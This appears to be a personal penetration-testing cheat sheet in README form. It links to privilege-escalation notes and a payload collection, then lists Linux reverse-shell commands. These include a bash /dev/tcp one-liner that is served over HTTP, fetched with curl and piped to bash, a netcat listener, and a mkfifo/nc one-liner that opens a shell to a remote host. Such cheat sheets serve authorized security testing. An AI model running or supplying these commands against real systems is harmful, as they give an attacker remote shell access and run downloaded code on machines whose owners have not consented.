# Cheat Sheet
Here are some commands, reverse shells, and small scripts that I keep for pen-testing.

## Quick Links
[Linux Privilege Escalation](LinuxPrivEsc/README.md)

[Windows Privilege Escalation](WindowsPrivEsc/README.md)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Web Penetration Testing Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Reverse Shell
Alternate ways to gain shells.

### Linux
Using cURL
```bash
echo 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1' > rev.sh
python3 -m http.server 8080
nc -lnvp 1337
curl http://10.10.10.10:8080/rev.sh | bash
```
Probably the least-special-characters way (and with sh):
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337 > /tmp/f
```
